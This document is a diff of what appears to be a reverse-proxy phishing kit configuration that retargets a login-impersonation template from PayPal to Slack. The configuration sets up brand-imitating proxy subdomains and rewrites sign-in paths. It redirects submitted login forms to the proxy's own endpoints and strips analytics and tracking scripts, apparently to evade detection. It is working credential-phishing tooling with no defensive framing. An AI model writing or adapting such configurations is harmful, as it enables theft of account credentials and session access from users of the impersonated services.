@@ -1,9 +1,9 @@
-name: "PayPal-Login"
+name: "Slack-Login"
 author: "Vanta v5"
 min_ver: "5.0.0"
 proxy_hosts:
-  - subdomain: "paypal"
-    target: "www.paypal.com"
+  - subdomain: "slack"
+    target: "slack.com"
 auth_urls: ["/signin"]
 landing_path: ["/signin"]
 auth_tokens: []
@@ -15,6 +15,6 @@ path_rewrites:
   - {pattern: "^/$", replace: "/signin", methods: ["GET"]}
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/tagmanager/", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|/track|/stats", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
-  - {selector: "form[action*=\"signin\"], form[action*=\"login\"]", action_to: "/session"}
+  - {selector: "form[action*=\"signin\"], form[action*=\"login\"]", action_to: "/api/signin"}
